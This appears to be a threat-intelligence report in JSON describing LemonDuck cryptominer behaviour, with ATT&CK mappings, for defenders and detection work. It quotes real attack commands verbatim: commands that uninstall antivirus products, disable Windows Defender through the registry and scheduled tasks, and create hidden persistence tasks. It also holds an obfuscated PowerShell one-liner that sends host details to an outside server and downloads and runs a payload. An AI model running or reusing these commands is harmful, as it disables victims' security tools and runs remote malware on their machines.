{
  "header": {
    "sightingReportId": "ea5d4b48-c5c9-4483-9036-e791a70394bb",
    "status": "wip",
    "description": "This Threat Sighting documents observed TTPs for LemonDuck covering Execution, Defense Evasion, Persistence and Command And Control tactics. This analysis is based on EDR Telemetry analysis and public _any.run_ sandbox reports. LemonDuck is a cryptocurrency miner which surfaced on the threat landscape in 2019. The malware uses multiple infection vectors such as spam campaigns with malicious attachments and targeting vulnerable Microsoft Exchange, Oracle WebLogic, Hadoop, and Redis servers.",
    "author": "Alejandro Houspanossian (@lekz86)",
    "acknowledgement": "@lekz86",
    "tlp": "white",
    "threatInformation": {
      "adversaries": [
        "unknown"
      ],
      "malware": [
        "LemonDuck"
      ],
      "tools": [
        "powershell"
      ],
      "lolbas": [
        "wmic",
        "cmd",
        "schtasks",
        "reg"
      ]
    }
  },
  "threatSightings": [
    {
      "sighting": "Execution - Threat actor used _WMIC_ to uninstall software security solutions via _PowerShell_ and _CMD_ for Defense Evasion.",
      "id": "92de8724-9673-41b0-a922-81276dcb6f0a",
      "behaviors": [
        {
          "behavior": "_PowerShell_ spawns multiple execution of _CMD_ to uninstall software security solutions via _WMIC_.",
          "id": "12346060-2ba6-4188-a72a-61e74f865412",
          "type": "Process Created",
          "weapon": "wmic",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%Eset%\\'\\\" call uninstall /nointeractive",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%Kaspersky%\\'\\\" call uninstall /nointeractive",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%avast%\\'\\\" call uninstall /nointeractive",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%Security%\\'\\\" call uninstall /nointeractive",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%AntiVirus%\\'\\\" call uninstall /nointeractive",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start /b wmic.exe product where \\\"name like \\'%Norton Security%\\'\\\" call uninstall /nointeractive"
              ],
              "parentProcess": "PowerShell"
            }
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1562.001 - Impair Defenses: Disable or Modify Tools"
            ],
            "execution": [
              "T1047 - Windows Management Instrumentation",
              "T1059.001 - Command and Scripting Interpreter: PowerShell",
              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
            ]
          }
        }
      ]
    },
    {
      "sighting": "Execution - Threat actor used _Reg.exe_ to disable Windows Defender Policies via _PowerShell_ and _CMD_ for Defense Evasion.",
      "id": "12348724-9673-41b0-a922-81276dcb6f0a",
      "behaviors": [
        {
          "behavior": "_PowerShell_ spawns multiple executions of _CMD_ to run _Reg.exe_.",
          "id": "d3bf7ac7-fe10-44bf-b237-56b182f65098",
          "type": "Process Created",
          "weapon": "reg",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v DisableAntiVirus /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\\" /v MpEnablePus /t REG_DWORD /d 0 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v SpynetReporting /t REG_DWORD /d 0 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\\" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
            }
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1562.001 - Impair Defenses: Disable or Modify Tools",
              "T1112 - Modify Registry"
            ],
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell",
              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
            ]
          }
        }
      ]
    },
    {
      "sighting": "Execution - Threat actor used _SCHTASKS_ to disable Windows Defender Scheduled Tasks via _PowerShell_ for Defense Evasion.",
      "id": "67848724-9673-41b0-a122-81276dcb6f0a",
      "behaviors": [
        {
          "behavior": "_PowerShell_ spawns multiple executions of _SCHTASKS_.",
          "id": "aa99b653-978e-4dac-8e50-4f37e2a4e012",
          "type": "Process Created",
          "weapon": "schtasks",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\system32\\\\schtasks.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /Change /TN \\\"Microsoft\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh\\\" /Disable",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\\" /Disable",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\\" /Disable",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\\" /Disable",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\\" /Disable"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
            }
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1562.001 - Impair Defenses: Disable or Modify Tools",
              "T1053.005 - Scheduled Task/Job: Scheduled Task"
            ],
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell"
            ]
          }
        }
      ]
    },
    {
      "sighting": "Execution - Threat actor used _Reg.exe_ to disable Windows Defender Policies and Services via _PowerShell_ for Defense Evasion.",
      "id": "98748724-9673-41b0-a122-81276dcb680a",
      "behaviors": [
        {
          "behavior": "_PowerShell_ spawns multiple executions of _CMD_ to Disable Windows Defender Policies.",
          "id": "a16b28c4-da3c-468c-a314-b381da2c53a8",
          "type": "Process Created",
          "weapon": "reg",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\system32\\\\cmd.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run /v \\\"Windows Defender\\\" /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\"Windows Defender\\\" /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsDefender /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg delete HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
            }
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1562.001 - Impair Defenses: Disable or Modify Tools",
              "T1112 - Modify Registry"
            ],
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell",
              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
            ]
          }
        },
        {
          "behavior": "_PowerShell_ spawns multiple executions of _CMD_ to Disable Windows Defender Services.",
          "id": "d36b28c4-da3c-468c-a314-9e81da2c53d8",
          "type": "Process Created",
          "weapon": "reg",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\system32\\\\cmd.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot /v Start /t REG_DWORD /d 4 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter /v Start /t REG_DWORD /d 4 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv /v Start /t REG_DWORD /d 4 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc /v Start /t REG_DWORD /d 4 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend /v Start /t REG_DWORD /d 4 /f",
                "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
            }
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1562.001 - Impair Defenses: Disable or Modify Tools",
              "T1112 - Modify Registry"
            ],
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell",
              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
            ]
          }
        }
      ]
    },
    {
      "sighting": "Execution - Threat actor used _SCHTASKS_ to create and execute scheduled tasks for Persistence.",
      "id": "0dea519a-c078-45b2-b66e-d7da3d6b4eb6",
      "behaviors": [
        {
          "behavior": "_PowerShell_ spawns multiple executions of _SCHTASKS_.",
          "id": "abc96060-2ba6-4188-a72a-61e74f777447",
          "type": "Process Created",
          "weapon": "schtasks",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\system32\\\\schtasks.exe",
              "cmdLine": [
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /create /sc MINUTE /mo 120 /tn blackball1 /F /tr blackball1",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /create /sc MINUTE /mo 120 /tn blackball /F /tr blackball",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /create /sc MINUTE /mo 60 /tn \\\\lUWLs8e0z /F /tr \\\"powershell -w hidden -c PS_CMD\\\"",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /create /sc MINUTE /mo 60 /tn a2utp8I\\\\g4yeU6uwoY /F /tr \\\"powershell -w hidden -c PS_CMD\\\"",
                "\\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\\" /run /tn a2utp8I\\\\g4yeU6uwoY"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
            }
          ],
          "att&ck": {
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell"
            ],
            "persistence": [
              "T1053.005 - Scheduled Task/Job: Scheduled Task"
            ]
          }
        }
      ]
    },
    {
      "sighting": "Execution - Threat actor used a _highly obfuscated PowerShell_ commands for Command And Control.",
      "id": "456f8200-63c7-4456-8f6a-455012106a5",
      "behaviors": [
        {
          "behavior": "_CMD_ spawns execution of _PowerShell_ one-liner.",
          "id": "65386224-91e5-4fe3-b4f5-087795523f85",
          "type": "Process Created",
          "weapon": "cmd",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
              "cmdLine": [
                "/c powershell -w hidden -c function a($u)[REDACTED]"
              ],
              "parentProcess": "n/d"
            }
          ],
          "att&ck": {
            "execution": [
              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
            ]
          }
        },
        {
          "behavior": "_PowerShell_ executes one-liner.",
          "id": "0c04934c-95b2-441d-9db1-f22d9f706aa4",
          "type": "Process Created",
          "weapon": "powershell",
          "processes": [
            {
              "process": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
              "cmdLine": [
                "powershell -w hidden -c function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient).\\\"DownloadData\\\"($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url='http://'+'t.zz3'+'r0.com';a($url+'/aa.jsp?ipc_20210405?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join'*'))"
              ],
              "parentProcess": "C:\\\\Windows\\\\System32\\\\cmd.exe"
            }
          ],
          "notes": [
            "The command is highly obfuscated."
          ],
          "att&ck": {
            "defenseEvasion": [
              "T1027 - Obfuscated Files or Information"
            ],
            "execution": [
              "T1059.001 - Command and Scripting Interpreter: PowerShell"
            ]
          }
        }
      ]
    }
  ],
  "footer": {
    "changeTracking": {
      "created": "2022-03-15T00:00:00Z",
      "lastModified": "2022-03-17T00:00:00Z",
      "sightingVersion": 1,
      "schemaVersion": 1.7
    },
    "references": [
      "https://www.microsoft.com/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/",
      "https://app.any.run/tasks/696a24ef-dc37-44f5-a951-3680d7277eb1"
    ]
  }
}
